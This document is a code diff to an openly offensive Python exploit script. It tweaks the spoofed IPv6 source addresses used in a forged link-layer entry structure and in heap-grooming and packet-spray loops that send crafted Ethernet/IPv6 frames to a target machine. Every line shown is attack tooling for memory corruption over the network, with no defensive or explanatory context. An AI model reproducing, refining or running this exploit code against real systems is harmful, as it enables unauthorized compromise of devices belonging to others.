@@ -165,7 +165,7 @@ class Exploit():
 
     SOURCE_MAC = '41:41:41:41:41:41'
     SOURCE_IPV4 = '192.168.2.1'
-    SOURCE_IPV6 = 'fe80::4141:4141:4141:4141'
+    SOURCE_IPV6 = 'fe80::9f9f:41ff:9f9f:41ff'
 
     TARGET_IPV4 = '192.168.2.2'
 
@@ -456,7 +456,7 @@ class Exploit():
         fake_lle += p32(0)  # sin6_flowinfo
         # sin6_addr
         fake_lle += p64be(0xfe80000100000000)
-        fake_lle += p64be(0x4141414141414141)
+        fake_lle += p64be(0x9f9f41ff9f9f41ff)
         fake_lle += p32(0)  # sin6_scope_id
 
         # pad
@@ -632,7 +632,7 @@ class Exploit():
             if i % 0x100 == 0:
                 print('[*] Heap grooming...{}%'.format(100 * i //self.SPRAY_NUM),end='\r',flush=True)
 
-            source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
+            source_ipv6 = 'fe80::{:04x}:41ff:9f9f:41ff'.format(i)
 
             self.s.send(
                 Ether(src=self.source_mac, dst=self.target_mac) /
@@ -712,7 +712,7 @@ class Exploit():
             if i >= self.HOLE_START and i % self.HOLE_SPACE == 0:
                 continue
 
-            source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
+            source_ipv6 = 'fe80::{:04x}:41ff:9f9f:41ff'.format(i)
 
             self.s.send(
                 Ether(src=self.source_mac, dst=self.target_mac) /
